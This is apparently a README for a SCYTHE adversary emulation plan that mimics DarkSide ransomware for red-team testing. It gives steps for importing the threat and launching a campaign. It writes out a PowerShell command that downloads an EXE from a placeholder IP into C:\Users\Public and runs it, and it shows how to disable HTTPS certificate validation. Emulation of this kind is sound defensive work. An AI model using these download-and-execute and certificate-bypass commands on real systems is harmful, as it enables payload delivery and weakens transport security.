# DarkSide Ransomware Adversary Emulation Plan

This threat was posted after the Colonial Pipeline ransomware attack on May 7, 2021. It is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-darkside-ransomware

This threat is based on Cybereason's Cyber Threat Intelligence from April 2021: https://www.cybereason.com/blog/cybereason-vs-darkside-ransomware

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/DarkSide/DarkSide_scythe_threat.json
2. Download the Virtual File System (VFS) files under DarkSide/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/DarkSide
4. Ensure HTTP Relay is running on your SCYTHE server.
5. Create a new campaign, selecting HTTP, and ensuring the communication options match your HTTP Relay. Consider using a "naked IP address" instead of a domain to more closely emulate this attack.
6. Import from Existing Threat: DarkSide
7. Launch Campaign
8. Click More Actions and copy the URL for the desired EXE. 
9. In the target system, run this PowerShell command with the respective URL to download the payload as documented in the CTI: powershell -Command "(New-Object Net.WebClient).DownloadFile('http://0.0.0.0/ServiceLogin123','C:\Users\Public\update.exe')"
10. Execute update.exe

Note that SCYTHE forces HTTPS for operational security. Using an IP will result in a HTTPS certificate validation issue. To get around that:
- Open a PowerShell command prompt
- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
- (New-Object Net.WebClient).DownloadFile('http://0.0.0.0/ServiceLogin123','C:\Users\Public\update.exe')
- C:\Users\Public\update.exe
